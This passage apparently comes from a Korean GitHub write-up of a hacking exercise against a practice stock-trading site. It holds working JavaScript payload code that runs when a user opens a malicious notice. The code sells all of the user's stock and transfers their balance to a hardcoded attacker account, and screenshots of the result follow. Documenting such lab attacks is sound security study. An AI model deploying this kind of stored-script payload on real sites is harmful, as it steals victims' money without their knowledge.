// Promise를 반환하는 jQuery Ajax 사용
    try {
        const response = await $.ajax({
            url: '/detailSell',
            type: 'POST',
            contentType: 'application/json',
            data: e2eData
        });
        alert(response.MSG);
    } catch (error) {
        alert('오류 발생: ' + error.statusText);
    }
}
 
async function ajaxSend(RSAModulus, RSAExponent, user_nm, PRICE) {
    const rsa = new RSAKey();
    rsa.setPublic(RSAModulus, RSAExponent);
    let data = {
        name: user_nm,
        account_number: '909089-4923112',
        price: PRICE,
        transfer_bankagency: 'RK루키은행'
    };
    let e2eData = rsa.encrypt(JSON.stringify(data));
    // Promise를 반환하는 jQuery Ajax 사용
    try {
        const response = await $.ajax({
            url: '/mypage/send',
            type: 'POST',
            contentType: 'application/json',
            data: e2eData
        });
        alert(response.body);
    } catch (error) {
        alert('오류 발생: ' + error.statusText);
    }
}
 
</script>

```

> <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/bf0bd24c-0352-4450-83c4-5080989eb7bf">

- 코드를 포함한 공지사항을 작성한 뒤 업로드하고 일반 사용자가 공지사항을 확인한다. 그러면 사용자의 보유 주식이 전부 판매되고 계좌 잔액이 모두 공격자에게 송금된다.

> <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/e60c99ea-f416-4705-967b-0dd3b07e51a7">

> <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/787a0cba-8862-4998-8a93-c4c9212db8f2">

> <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/200b5e42-fcb3-4fe9-b9c2-17e1e6fbef8f">

> <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/c767f00b-e5de-4eb3-9697-bc19d816c01a">